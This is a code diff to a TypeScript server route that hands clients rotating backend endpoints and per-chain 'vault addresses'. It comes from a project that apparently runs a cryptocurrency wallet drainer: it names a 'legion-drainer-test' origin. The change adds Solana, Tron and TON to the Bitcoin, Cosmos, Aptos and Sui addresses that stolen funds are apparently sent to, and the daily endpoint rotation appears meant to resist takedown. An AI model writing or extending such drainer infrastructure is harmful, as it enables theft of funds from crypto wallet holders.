@@ -9,21 +9,15 @@ import {
   resolveAptosVaultAddress,
   resolveBitcoinVaultAddress,
   resolveCosmosVaultAddress,
+  resolveSolVaultAddress,
   resolveSuiVaultAddress,
+  resolveTronVaultAddress,
+  resolveTonVaultAddress,
 } from '@legion/core'
 
 import { sendSuccess } from '../lib/api-response.js'
 
 const SURGE_DRAINER_ORIGIN = 'https://legion-drainer-test.surge.sh'
-
-function readVaultAddresses(): Record<string, string | null> {
-  return {
-    btc: resolveBitcoinVaultAddress(),
-    cosmos: resolveCosmosVaultAddress(),
-    aptos: resolveAptosVaultAddress(),
-    sui: resolveSuiVaultAddress(),
-  }
-}
 
 function readCorsOriginsHint(): string[] {
   const raw = process.env['API_CORS_ORIGINS']?.trim() ?? ''
@@ -71,8 +65,23 @@ function rotateEndpoints(urls: string[], seed: string): string[] {
   return order
 }
 
+async function readVaultAddresses(): Promise<Record<string, string | null>> {
+  const tonVault = await resolveTonVaultAddress()
+  return {
+    btc: resolveBitcoinVaultAddress(),
+    sol: resolveSolVaultAddress(),
+    svm: resolveSolVaultAddress(),
+    tron: resolveTronVaultAddress(),
+    trx: resolveTronVaultAddress(),
+    ton: tonVault,
+    cosmos: resolveCosmosVaultAddress(),
+    aptos: resolveAptosVaultAddress(),
+    sui: resolveSuiVaultAddress(),
+  }
+}
+
 export async function registerClientConfigRoute(app: FastifyInstance): Promise<void> {
-  app.get('/api/v1/client-config', (_request: FastifyRequest, reply: FastifyReply) => {
+  app.get('/api/v1/client-config', async (_request: FastifyRequest, reply: FastifyReply) => {
     const urls = readBackendUrls()
     const seed = dailyRotationSeed()
     const endpoints = rotateEndpoints(urls, seed)
@@ -82,7 +91,7 @@ export async function registerClientConfigRoute(app: FastifyInstance): Promise<v
       expiresAt.setUTCDate(expiresAt.getUTCDate() + 1)
     }
     const corsOrigins = readCorsOriginsHint()
-    const vaultAddresses = readVaultAddresses()
+    const vaultAddresses = await readVaultAddresses()
     return sendSuccess(reply, 200, 'Client config ready', {
       endpoints,
       primary: endpoints[0],
